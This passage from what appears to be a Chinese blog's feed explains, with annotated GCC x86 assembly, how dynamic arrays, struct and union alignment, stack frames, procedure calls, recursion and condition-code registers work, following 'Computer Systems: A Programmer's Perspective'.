class="line"></div><div class="line">    ret</div><div class="line"></div><div class="line">    .size    sum, .-sum</div><div class="line"></div><div class="line">    .ident    &quot;GCC: (Ubuntu 4.4.3-4ubuntu5.1) 4.4.3&quot;</div><div class="line"></div><div class="line">    .section    .note.GNU-stack,&quot;&quot;,@progbits</div></pre></td></tr></table></figure>
<p>哇塞，第一次看到这么长的汇编代码，它看起来比定长数组要复杂太多，不管是长度还是其中的指令。不禁思考编译器这一次怎么这么笨了？猜测，动态数组的复杂性可能也是动态数组出现较晚的原因，更何况动态数组还有<code>缓冲区溢出</code>的危险。</p>
<p>现在我们一点点分析汇编代码，一探究竟。首先我们分析第一部分，包括了栈帧的建立、被调用者保存寄存器的备份以及栈内存的分配。它包括了以下几个开头的指令。</p>
<pre><code>pushl    %ebp

movl    %esp, %ebp

pushl    %esi

pushl    %ebx

subl    $16, %esp
</code></pre><p>用一幅图来说明这个问题，我们来分别看看，在指令执行前后，寄存器以及存储器的状态。</p>
<p><img src="/images/汇编-31.png" alt="动态数组"></p>
<p>接下来，我们看看比较复杂的一段代码，这一段代码的主要目的，是为动态数组分配内存。它们是如下的这些指令。</p>
<pre><code>movl    8(%ebp), %ebx

movl    %gs:20, %edx

movl    %edx, -12(%ebp)

xorl    %edx, %edx

leal    30(,%ebx,4), %edx

andl    $-16, %edx

subl    %edx, %esp

leal    15(%esp), %esi

andl    $-16, %esi
</code></pre><p>这一段代码相对于上一段就复杂了一点，还是先上一个指令执行前后的图，如下。</p>
<p><img src="/images/汇编-32.png" alt="动态数组"></p>
<p>我们仔细对比一下左右两张图可以发现，这里面最主要的两个值，就存在%edx和%esi寄存器当中。其中%edx的值是为数组分配的内存字节数，而%esi当中存储的则是数组的起始地址。我们不难想到，对于一个int类型长度为n的数组，它占用的内存字节数肯定是4n。而这里特别的地方就是，为什么不直接分配4n个字节然后把栈顶作为数组起始位置，而是分配了<code>(30+4n)&amp;(-16)</code>的字节，之后又把<code>(%esp+15)&amp;(-16)</code>的位置作为数组的起始位置？<code>为了效率</code>。</p>
<p>为了提高内存的读取速度，一般都会将<code>字节对齐</code>，而针对栈内存的分配，则大部分会保持为16字节的倍数。比如，如果处理器总是一次性从存储器中读取16个字节，则地址必须为16的倍数才行，也就是说地址的后4位必须为0。这样的话我们就好理解了，因为栈帧操作是从栈顶开始，直到帧指针或者备份着被调用者寄存器的内存位置为止（也就是上图中局域变量区域的范围），因此我们需要保证分配的字节数是16的倍数。</p>
<p>如此一来，分配<code>(30+4n)&amp;(-16)</code>个字节，就可以保证上图中-24的位置到<code>%esp</code>依然是16的倍数。<strong>因为对于任意一个正整数i来讲，都有i - 15 =&lt; i&amp;(-16) &lt;= i，并且i&amp;(-16)是16的倍数。因此对于(30+4n)&amp;(-16)来说，就有 <code>4n + 15 =&lt; (30+4n)&amp;(-16) &lt;= 4n + 30</code> 的结果</strong></p>
<p>这就保证了新分配的栈内存大小既是16的倍数，又能装下n个整数，因为它大于4n。不过这里很明显至少多了15个字节，这15个字节会被数组的起始地址消除掉。从图中可以看出，数组的起始地址并不是从栈顶开始的（从<code>%esi</code>指向的位置开始），这是因为数组的起始地址等于<code>(%esp+15)&amp;(-16)</code>，而不是<code>%esp</code>。这样做的目的也是为了对齐，只不过这里是地址对齐，将数组的起始地址对齐到16倍数的位置。由上面的结论我们知道 <code>%esp =&lt; (%esp+15)&amp;(-16) &lt;= %esp + 15</code>。</p>
<p>这样就保证了数组的起始地址不会逃出栈顶，这也是%esp要加上15的原因。由于数组的起始地址可能上移15位，因此原本预留的空间将可能再次缩小15个字节（位于<code>%esi</code>和<code>%esp</code>之间的那一小段）。因此我们就能得出实际可用的空间stack有如下范围 <code>4n &lt;= stack &lt;= 4n + 15</code> 。</p>
<p>这下我们就明白了，为什么4n要加上30，而不是加上15。是因为两次与-16的“与”运算，可能让空间浪费30个字节。所以加上30之后，就可以保证在满足栈内局部变量长度和数组起始位置都为16的倍数的前提下，还能至少留出4n的空间供数组使用。</p>
<p>还有一点需要一提的是，上图当中还出现了一个“金丝雀值”，这个家伙是为了<code>防止栈缓冲区溢出</code>。这当中的值是存储器当中的一个随机值，倘若这个值在函数返回时改变了，那么就代表缓冲区溢出了，就会终止程序的运行。</p>
<p>到此动态数组占用的内存区域就分配好了，接下来的就相对来说比较简单了，基本上与定长数组是一样的。下面是接下来所有的汇编代码，直接加入了详细的注释，相信大家都能看懂。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">testl    %ebx, %ebx//测试n是否大于0</div><div class="line"></div><div class="line">    jle    .L2//如果n小于等于0，就跳过两个循环，跳到L2</div><div class="line"></div><div class="line">    movl    $0, %ecx//%ecx与定长数组中的%eax作用一样，先初始化为0，后面逐渐+3赋给数组元素</div><div class="line"></div><div class="line">    movl    $0, %edx//%edx就是i，这里是i=0</div><div class="line"></div><div class="line">.L3:</div><div class="line"></div><div class="line">    movl    %ecx, (%esi,%edx,4)//对于i=0的时候来说，这里则相当于a[0]=0，因为%esi是数组起始地址。对于i来说，这里则代表a[i]=%ecx，a[i]的地址为a+4*i。</div><div class="line"></div><div class="line">    addl    $1, %edx//i自增</div><div class="line"></div><div class="line">    addl    $3, %ecx//将%eax加3，对于i=0的时候来说，%ecx就是a[1]的值。对于i来说，%ecx就是a[i+1]的值。</div><div class="line"></div><div class="line">    cmpl    %ebx, %edx//比较n和i</div><div class="line"></div><div class="line">    jne    .L3//如果i和n不相等则继续循环。</div><div class="line"></div><div class="line">    movl    $0, %edx//再次将i清0，即i=0</div><div class="line"></div><div class="line">.L4:</div><div class="line"></div><div class="line">    addl    (%esi,%edx,4), %eax//%eax就相当于sum，这里其实就是sum = sum + a[i]，其中a[i]的地址为a+4*i。</div><div class="line"></div><div class="line">    addl    $1, %edx//i自增</div><div class="line"></div><div class="line">    cmpl    %ebx, %edx//比较n和i</div><div class="line"></div><div class="line">    jne    .L4//如果n和i不相等则继续循环</div><div class="line"></div><div class="line">.L2:</div><div class="line"></div><div class="line">    movl    -12(%ebp), %edx//取出金丝雀值</div><div class="line"></div><div class="line">    xorl    %gs:20, %edx//比较金丝雀值是否改变</div><div class="line"></div><div class="line">    je    .L6//如果金丝雀值与原来的值相等，则代表缓冲区没溢出，跳到L6继续执行。</div><div class="line"></div><div class="line">    call    __stack_chk_fail//如果不相等，则代表缓冲区溢出，产生一个栈检查错误。</div><div class="line"></div><div class="line">.L6:</div><div class="line"></div><div class="line">    leal    -8(%ebp), %esp//让栈顶指向备份的%ebx，回收内存。</div><div class="line"></div><div class="line">    popl    %ebx//还原备份的%ebx值</div><div class="line"></div><div class="line">    popl    %esi//还原备份的%esi值</div><div class="line"></div><div class="line">    popl    %ebp//恢复原来的帧指针</div><div class="line"></div><div class="line">    .p2align 4,,1//对齐地址为16的倍数</div><div class="line"></div><div class="line">    ret//函数返回</div></pre></td></tr></table></figure>
<p>上面的这些指令相对来讲就比前面的简单了许多，相信各位看注释就能理解的八九不离十了，唯一特别一点的指令就是最后一个<code>p2align指令</code>。第一次见过这个指令，不过从名字上也能大概猜出来是干嘛的，不过为了准确，还是google到了这个指令的简单说明。它会将地址对齐为16（也就是第一个参数4，表示2的4次方的意思）的倍数，并最多跳过1个字节（也就是最后的参数1）。如果对齐需要跳过多于1个字节，则会忽略这个指令。</p>
<h3 id="异质结构与数据对齐"><a href="#异质结构与数据对齐" class="headerlink" title="异质结构与数据对齐"></a>异质结构与数据对齐</h3><p>异质结构是指不同数据类型的数组组合，比如C语言当中的结构（struct）与联合（union）。在理解数组的基础上，这两种数据结构都非常好理解。我们先来看一个结构的例子，比如下面的这个结构。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">#include &lt;stdio.h&gt;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">struct &#123;</div><div class="line"></div><div class="line">    int a;</div><div class="line"></div><div class="line">    int b;</div><div class="line"></div><div class="line">    char c;</div><div class="line"></div><div class="line">&#125; mystruct;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">int main()&#123;</div><div class="line"></div><div class="line">    printf(&quot;%d\n&quot;,sizeof mystruct);</div><div class="line"></div><div class="line">    </div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这是一个非常简单的结构体，这个程序在32位windows系统上，输出结果是12，或许有的猿友还可以得到10或者16这样的结果。或许有的猿友会奇怪，为什么不是4+4+1=9呢。</p>
<p>这正是因为上面我们提到过的<code>对齐</code>的原因，只不过这里的对齐不是地址对齐也不是栈分配空间对齐，而是<code>数据对齐</code>。为了提高数据读取的速度，一般情况下会将数据以2的指数倍对齐，具体是2、4、8还是16，得根据具体的硬件设施以及操作系统来决定。</p>
<p>这样做的好处是，处理器可以统一的一次性读取4（也可能是其它数值）个字节，而不再需要针对特殊的数据类型读取做特殊处理。在这个例子来说，也就是说在读取a、b、c时，都可以统一的读取4个字节。特殊的，这里0-3的位置用于存储a，4-7的位置用于存储b，8的位置用于存储c，而9-11则用于填充，其中都是空的。</p>
<p>与结构体不同的是，联合会复用内存空间，以节省内存，比如我们看下面这个例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">#include &lt;stdio.h&gt;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">union &#123;</div><div class="line"></div><div class="line">    int a;</div><div class="line"></div><div class="line">    int b;</div><div class="line"></div><div class="line">    char c;</div><div class="line"></div><div class="line">&#125; myunion;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">int main()&#123;</div><div class="line"></div><div class="line">    printf(&quot;%d\n&quot;,sizeof myunion);</div><div class="line"></div><div class="line">    </div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这段程序输出的结果是4，依旧是32位windows操作系统的结果。这是因为a、b、c会共用4个字节，这样做的目的不言而喻，是为了节省内存空间，显然它比结构体节省了8个字节的空间。它与结构体最大的区别就在于，对a、b、c赋值时，联合会覆盖掉之前的赋值，而结构体则不会，结构体可以同时保存a、b、c的值。</p>
<p>文章内容来源：<a href="http://www.cnblogs.com/zuoxiaolong/p/computer20.html" target="_blank" rel="external">深入理解计算机系统（3.8）—数组、异质结构以及指针的详解（十分重要）（难度较高）【呕心沥血版】</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;现在我们一起去探讨C语言中数组、结构体的实现，相比之下，数组与流程控制和过程的实现难度差不多，尤其是动态数组可能相对来说困难一点。&lt;/p&gt;
&lt;h3 id=&quot;数组简介&quot;&gt;&lt;a href=&quot;#数组简介&quot; class=&quot;headerlink&quot; title=&quot;数组简介&quot;&gt;&lt;/a&gt;数
    
    </summary>
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/tags/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统|汇编的世界-5</title>
    <link href="http://yoursite.com/2018/05/08/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E6%B1%87%E7%BC%96%E7%9A%84%E4%B8%96%E7%95%8C-5/"/>
    <id>http://yoursite.com/2018/05/08/深入理解计算机系统-汇编的世界-5/</id>
    <published>2018-05-08T11:30:10.000Z</published>
    <updated>2018-05-08T05:03:05.691Z</updated>
    
    <content type="html"><![CDATA[<p>这一节我们探讨过程调用[函数调用]是如何完成的。</p>
<h3 id="栈帧的结构"><a href="#栈帧的结构" class="headerlink" title="栈帧的结构"></a>栈帧的结构</h3><p>倘若我们要想搞清楚过程的实现，就必须先知道栈帧的结构是如何构成的。栈帧其实可以认为是程序栈的一段，而程序栈又是存储器的一段，因此栈帧说到底还是存储器的一段。那么既然是一段，肯定有两个端点。</p>
<p>这两个端点其实就是两个地址，<strong>一个标识着起始地址，一个标识着结束地址，而这两个地址，则分别存储在固定的寄存器当中，即起始地址存在%ebp寄存器当中，结束地址存在%esp寄存器当中</strong>。至于为什么要存在这两个寄存器当中，就像程序的下一条指令地址为什么存在PC当中一样，是毫无意义的问题，就是这样规定的，没有为什么。</p>
<p>起始地址和结束地址还有另外的名字，起始地址通常称为帧指针，结束地址通常称为栈指针（也就是栈顶的地址）。因此，我们就把过程的存储器内存使用区域称为栈帧。这下我们就了解了栈帧的来历以及它们的命名习惯和存储惯例，接下来的一幅图，它揭示了栈帧在存储器当中的位置。</p>
<p><img src="/images/汇编-25.png" alt="栈帧"></p>
<p>这个图基本上已经包括了程序栈的构成，它由一系列栈帧构成，这些栈帧每一个都对应一个过程，而且每一个帧指针+4的位置都存储着函数的返回地址，每一个帧指针指向的存储器位置当中都备份着调用者的帧指针。各位需要知道的是，每一个栈帧都建立在调用者的下方（也就是地址递减的方向），当被调用者执行完毕时，这一段栈帧会被释放。还有一点很重要的是，%ebp和%esp的值指示着栈帧的两端，而栈指针会在运行时移动，所以大部分时候，在访问存储器的时候会基于帧指针访问，因为在一直移动的栈指针无法根据偏移量准确的定位一个存储器位置。</p>
<p>　　还有一点比较重要的内容，就是栈帧当中内存的分配和释放。由于栈帧是向地址递减的方向延伸，因此如果我们将栈指针减去一定的值，就相当于给栈帧分配了一定空间的内存。这个理解起来很简单，因为在栈指针向下移动以后（也就是变小了），帧指针和栈指针中间的区域会变长，这就是给栈帧分配了更多的内存。相反，如果将栈指针加上一定的值，也就是向上移动，那么就相当于压缩了栈帧的长度，也就是说内存被释放了。<strong>需要注意的是，上面的一切内容，都基于一个前提，那就是帧指针在过程调用当中是不会移动的。</strong></p>
<h3 id="过程的实现"><a href="#过程的实现" class="headerlink" title="过程的实现"></a>过程的实现</h3><p>过程虽然很好，但想要实现过程，还是存在一定难度的，尽管现在看来它并不困难。<strong>它实现的难度主要就在于数据如何在调用者和被调用者之间传递，以及在被调用者当中局部变量内存的分配以及释放。</strong></p>
<p>不过天大的难题都难不倒那群计算机界的大神们，他们找出了一种方式，可以简单并有效的处理过程实现当中的难题。这一切似乎看起来十分偶然，但其实也是必然的。世间的很多规律都是客观存在的，只是它在等着我们去发现而已。</p>
<p>总的来说，过程实现当中，<code>参数传递</code>以及<code>局部变量内存的分配和释放</code>都是通过以上介绍的栈帧来实现的，大部分情况下，我们认为过程调用当中做了以下几个操作。</p>
<p>1、备份原来的帧指针，调整当前的帧指针到栈指针的位置，这个过程就是我们经常看到的如下两句汇编代码做的事情。</p>
<pre><code>pushl    %ebp
movl    %esp, %ebp
</code></pre><p>2、建立起来的栈帧就是为被调用者准备的，当被调用者使用栈帧时，需要给临时变量分配预留内存，这一步一般是经过下面这样的汇编代码处理的。</p>
<pre><code>subl    $16,%esp
</code></pre><p>3、备份被调用者保存的寄存器当中的值，如果有值的话，备份的方式就是压入栈顶。因此会采用如下的汇编代码处理。</p>
<pre><code>pushl    %ebx
</code></pre><p>4、使用建立好的栈帧，比如读取和写入，一般使用mov，push以及pop指令等等。</p>
<p>5、恢复被调用者寄存器当中的值，这一过程其实是从栈帧中将备份的值再恢复到寄存器，不过此时这些值可能已经不在栈顶了。因此在恢复时，大多数会使用pop指令，但也并非一定如此。</p>
<p>6、释放被调用者的栈帧，释放就意味着将栈指针加大，而具体的做法一般是直接将栈指针指向帧指针，因此会采用类似下面的汇编代码处理（也可能是addl）。</p>
<pre><code>movl    %ebp,%esp
</code></pre><p>7、<strong>恢复调用者的栈帧，恢复其实就是调整栈帧两端，使得当前栈帧的区域又回到了原始的位置</strong>。因为栈指针已经在第六步调整好了，因此此时只需要将备份的原帧指针弹出到%ebp即可。类似的汇编代码如下。</p>
<pre><code>popl    %ebp
</code></pre><p>8、弹出返回地址，跳出当前过程，继续执行调用者的代码。<strong>此时会将栈顶的返回地址弹出到PC，然后程序将按照弹出的返回地址继续执行。这个过程一般使用<code>ret指令</code>完成。</strong></p>
<p>过程的实现大概就是以上八个步骤组成的，不过这些步骤并不都是必须的（大部分时候，开启编译器的优化会优化掉很多步骤），而且第6和第7步有时会使用leave指令代替。</p>
<h3 id="过程相关指令：call、leave、ret"><a href="#过程相关指令：call、leave、ret" class="headerlink" title="过程相关指令：call、leave、ret"></a>过程相关指令：call、leave、ret</h3><p>由于过程调用当中会经常见到几个新的指令，因此在这里，先给大家介绍一下这三个指令。它们三个都是过程实现当中非常重要的角色，这三个指令很类似，因为它们都是<strong>一个指令做了两件事</strong>，这里就依次介绍一下它们各自都做了什么事。</p>
<ul>
<li><p>call指令：它一共做两件事，第一件是将返回地址（也就是call指令执行时PC的值）压入栈顶，第二件是将程序跳转到当前调用的方法的起始地址。第一件事是为了为过程的返回做准备，而第二件事则是真正的指令跳转。</p>
</li>
<li><p>leave指令：它也是一共做两件事，第一件是将栈指针指向帧指针，第二件是弹出备份的原帧指针到%ebp。第一件事是为了释放当前栈帧，第二件事是为了恢复调用者的栈帧。</p>
</li>
<li><p>ret指令：它同样也是做两件事，第一件是将栈顶的返回地址弹出到PC，第二件事则是按照PC此时指示的指令地址继续执行程序。这两件事其实也可以认为是一件事，因为第二件事是系统自己保证的，系统总是按照PC的指令地址执行程序。</p>
</li>
</ul>
<p>可以看出，除了call指令之外，leave和ret指令都与上面8个步骤有些不可分割的关系。call指令没有在8个步骤当中体现，是因为它发生在进入过程之前，因此在第1步发生的时候，call指令往往已经被执行了，并且已经为ret指令准备好了返回地址。</p>
<h3 id="寄存器使用的规矩"><a href="#寄存器使用的规矩" class="headerlink" title="寄存器使用的规矩"></a>寄存器使用的规矩</h3><p>寄存器一共就8个，因此在数目上来说的话，使用起来肯定是捉襟见肘的。在这种情况下，就肯定需要一定的规矩去约束程序如何使用，否则要是一群人翻同一个人的牌子，那到底伺候谁才是呢。其实我们在之前已经或多或少的接触到了寄存器的规矩，比如%eax一般用于存储过程的返回值，%ebp保存帧指针，%esp保存栈指针。这里要介绍的，是另外一个规矩，而这个规矩是与过程实现相关的。</p>
<p>试想一下，在调用一个过程时，无论是调用者还是被调用者，都可能更新寄存器的值。假设调用者在%edx中存了一个整数值100，而被调用者也使用这个寄存器，并更新成了1000，于是悲剧就发生了。当过程调用完毕返回后，调用者再使用%edx的时候，值已经从100变成了1000，这几乎必将导致程序会错误的执行下去。</p>
<p>为了避免上面这种情况发生，就需要在调用者和被调用者之间做一个协调。于是便有了这样的规矩，它的描述如下，我们假设这里在过程P中调用了过程Q，P是调用者，Q是被调用者。</p>
<ul>
<li><p><code>%eax、%edx、%ecx</code>：这三个寄存器被称为调用者保存寄存器。意思就是说，这三个寄存器由调用者P来保存，而对于Q来说，Q可以随便使用，用完了就不用再管了。</p>
</li>
<li><p><code>%ebx、%esi、%edi</code>：这三个寄存器被称为被调用者保存寄存器。同样的，这里是指这三个寄存器由被调用者Q来保存，换句话说，Q可以使用这三个寄存器，但是如果里面有P的变量值，Q必须保证使用完以后将这三个寄存器恢复到原来的值，这里的备份，其实就是上面那8个步骤中第3个步骤做的事情。</p>
</li>
</ul>
<h3 id="一个过程示例"><a href="#一个过程示例" class="headerlink" title="一个过程示例"></a>一个过程示例</h3><p>进过上面纸上谈兵的阶段，接下来我们就要探索真理了，我们随便写一个如下的过程调用的例子，我们称它为function.c。</p>
<pre><code>int add(int a,int b){
   register int c = a + b; 
   return c;
}

int main(){
   int a = 100;
   int b = 101;
   int c = add(a,b);
   return c;
}
</code></pre><p>这里为了完整的展现那8个步骤，因此给变量c加了register关键字修饰，这将会将c送入寄存器，从而更改被调用者保存寄存器，就会导致步骤3的发生。接下来我们就使用参数-S来编译这段代码，然后使用cat来看看这段代码的汇编形式。以下是main函数以及add函数各自的栈帧情况，贴心的我已经详细标记了它们属于哪个步骤。</p>
<p><img src="/images/汇编-26.png" alt="过程调用"></p>
<p><img src="/images/汇编-27.png" alt="过程调用"></p>
<p>由于我们没有使用编译优化，因此汇编代码会多出很多，这也为了完整的诠释我们的步骤。可以看到，图中包含了完整的8个步骤，但是无论是main函数还是add函数，它们单独来讲，都没有完整的8个步骤，这其实是大多数的情况。大部分时候，一个函数不会完全包含上述的8个步骤。</p>
<p>这里有几点各位需要注意的地方，首先第一点是，add函数会将返回结果存入%eax（前提是返回值可以使用整数来表示），在main函数中，call指令之后，默认将%eax作为返回结果来使用。第二点是，所有函数（包括main函数）都必须有第1步和第6、7、8步，这是必须的4步。最后一点是，我们的栈指针和帧指针有固定的大小关系，即栈指针永远小于等于帧指针，当二者相等时，当前栈帧被认为没有分配内存空间。</p>
<h3 id="递归过程调用"><a href="#递归过程调用" class="headerlink" title="递归过程调用"></a>递归过程调用</h3><p>接下来我们看一个特殊的过程调用–递归是怎么实现的。</p>
<p>看一个递归求和的例子：</p>
<pre><code>int rfact(int n){
    int result;
    if(n&lt;=1){
        result = 1;
    }else{
        result = n * rfact(n-1);
    }
    return result;
}
</code></pre><p>接下来我们编译一下这段代码，使用-O1优化，我们可以得到如下的汇编代码。</p>
<p><img src="/images/汇编-29.png" alt="汇编代码"></p>
<p>如果理解了过程调用的机制，不难读懂这个递归调用的例子，但是难点就在于，栈帧的变化是如何的，贴心的我就给各位演示一下栈帧的变化过程，如果各位已经把前面的那个main函数和add函数搞定了，那么可以在这里验证一下自己的理解是否正确。</p>
<p><img src="/images/汇编-28.png" alt="递归调用"></p>
<p>需要特殊说明的是，以上每一个栈帧（大括号括起来的），最上面（也就是地址递增方向）的都是帧指针位置，最下面的都是栈指针位置。然而寄存器中只有%ebp和%esp保存栈帧指针，因此同一时间只能保存一对。当进展到第三层的时候，已经有了三个栈帧（原则上来讲一定是多于3个），寄存器当然是存不下的，因此就需要在存储器当中备份一下，之后再恢复。于是就出现了每个栈帧的帧指针指向的存储器位置，都会备份着外层方法（也就是调用者）的帧指针。</p>
<p>当方法递归到n=1结束时，栈帧会自下向上依次收回，栈帧指针（也就是%ebp和%esp当中的值）都会依次向上移动，直到程序结束。也就是说，上面的三幅图，如果倒过来，就是递归方法依次结束时栈帧的状态。</p>
<p>由此就可以看出，过程当中栈帧建立以及完成的惯例，可以保证递归调用的正常运行，包括循环调用。不得不说，这群计算机界的大神们实在是太牛了，尽管当栈帧出现以后，看起来也并不复杂，但难点就在于<code>无中生有的发现或者说某种意义上的创造</code>。</p>
<p>文章内容来自：<a href="http://www.cnblogs.com/zuoxiaolong/p/computer19.html" target="_blank" rel="external">深入理解计算机系统（3.7）—汇编世界当中过程的经典（十分重要）（难度较高）</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这一节我们探讨过程调用[函数调用]是如何完成的。&lt;/p&gt;
&lt;h3 id=&quot;栈帧的结构&quot;&gt;&lt;a href=&quot;#栈帧的结构&quot; class=&quot;headerlink&quot; title=&quot;栈帧的结构&quot;&gt;&lt;/a&gt;栈帧的结构&lt;/h3&gt;&lt;p&gt;倘若我们要想搞清楚过程的实现，就必须先知道栈帧的结构
    
    </summary>
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="深入理解计算机系统" scheme="http://yoursite.com/tags/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>深入理解计算机系统|汇编的世界-4</title>
    <link href="http://yoursite.com/2018/05/08/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E6%B1%87%E7%BC%96%E7%9A%84%E4%B8%96%E7%95%8C-4/"/>
    <id>http://yoursite.com/2018/05/08/深入理解计算机系统-汇编的世界-4/</id>
    <published>2018-05-07T17:28:03.000Z</published>
    <updated>2018-05-07T16:13:07.257Z</updated>
    
    <content type="html"><![CDATA[<h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p>本章我们来看一个特别有趣的内容，就是汇编级别的语言，如何利用寄存器实现if/for/while这些高级语言的流程控制，我相信你能感受到它的神奇之处。</p>
<h3 id="条件码寄存器"><a href="#条件码寄存器" class="headerlink" title="条件码寄存器"></a>条件码寄存器</h3><p>在汇编层面，if/for/while的流程控制，都是通过跳转来实现的，那是怎么判断是否跳转的呢？ <code>条件寄存器</code></p>
<table>
<thead>
<tr>
<th>寄存器</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td>CF (Carry Flag)</td>
<td>进位标志寄存器，它记录无符号操作的溢出，当溢出时会被设为1</td>
</tr>
<tr>
<td>ZF (Zero Flag)</td>
<td>零标志寄存器，当计算结果为0时将会被设为1</td>
</tr>
<tr>
<td>SF (Sign Flag)</td>
<td>符号标志寄存器，当计算结果为负数时会被设为1</td>
</tr>
<tr>
<td>OF (Overflow Flag)</td>
<td>溢出标志寄存器，当计算结果导致了补码溢出时，会被设为1</td>
</tr>
</tbody>
</table>
<p>从上面寄存器的简单说明可以看出，ZF和SF可以判断结果的符号，而CF和OF可以判断无符号和补码的溢出。而我们平时使用的高级程序语言，就仅仅靠这四个寄存器和跳转指令，就可以演化出千变万化的流程控制，再一次感叹汇编设计者的伟大。</p>
<h3 id="改变条件码寄存器的值"><a href="#改变条件码寄存器的值" class="headerlink" title="改变条件码寄存器的值"></a>改变条件码寄存器的值</h3><p>通常情况下，条件码寄存器的值无法主动被改变，它们大多时候是被动改变，这算是条件码寄存器的特色。这其实理解起来并不困难，因为条件码寄存器是1位的，而我们的数据格式最低为b，也就是8位，因此你无法使用任何数据传送指令去传送一个单个位的值。</p>
<p>几乎所有的算术与逻辑指令都会改变条件码寄存器的值，不过改变的前提是触发了条件码寄存器的条件。比如对于<code>subl %edx,%eax</code>这个减法指令，假设<code>%edx</code>和<code>%eax</code>寄存器的值都为<code>0x10</code>，则两者相减的结果为0，此时ZF寄存器将会被自动设为1。对于其它的指令运算，都是类似的，会根据结果的不同而设置不同的条件码寄存器。</p>
<h3 id="特殊的测试指令"><a href="#特殊的测试指令" class="headerlink" title="特殊的测试指令"></a>特殊的测试指令</h3><p>在进行算术与逻辑操作时，条件码寄存器的值可能随之改变。这里介绍两个比较特别的测试指令，它们不改变普通寄存器或者存储器的值，只是为了设置条件码寄存器的值。这算是唯二两个可以主动设置条件码寄存器的指令，它们分别是cmp以及test指令。</p>
<p>cmp是compare的意思，它有两个操作数，比如cmp S2，S1，最终会基于S1-S2的值去设置条件码寄存器的值。而对于test来说是类似的，对于test S2，S1来说，它将基于S1&amp;S2去设置条件码寄存器的值。另外需要一提的是，两者都需要加数据格式后缀，比如b、w、l这些后缀。</p>
<p>举个简单的例子，对于cmpl %edx，%eax这个指令来讲，假设%edx的值为y，%eax的值为x。则当x=y时，ZF将会被置为1。当x<y时，sf将会被置为1。而当x>y时，ZF和SF将同时为0。对于test指令来讲，则相对特别一点，它经常用于判断一个数是正数、负数，或者是0。当test用来判断一个数的正负零时，两个操作数为同一个，也就是说testl %eax，%eax可以用来判断%eax寄存器当中的值是正数、负数还是0。因此testl %eax，%eax就相当于cmpl $0，%eax这个指令。</y时，sf将会被置为1。而当x></p>
